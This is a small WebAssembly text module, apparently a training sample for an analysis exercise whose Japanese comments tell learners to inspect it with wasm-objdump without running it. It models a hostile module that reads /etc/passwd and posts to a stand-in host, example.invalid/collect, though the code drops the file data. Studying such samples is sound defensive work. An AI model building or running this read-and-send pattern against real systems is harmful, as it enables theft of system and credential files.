;; 演習 05 の調査対象。「どこかから配布された .wasm」という設定。
;; 読者はこれを実行せず、wasm-objdump だけで何をするモジュールかを読み取る。
(module
  (import "env" "read_file"  (func $read (param i32 i32) (result i32)))
  (import "env" "http_post"  (func $post (param i32 i32)))
  (memory (export "memory") 1)
  (data (i32.const 0)  "/etc/passwd")
  (data (i32.const 64) "https://example.invalid/collect")
  (func (export "_start")
    i32.const 0
    i32.const 11
    call $read
    drop
    i32.const 64
    i32.const 31
    call $post))
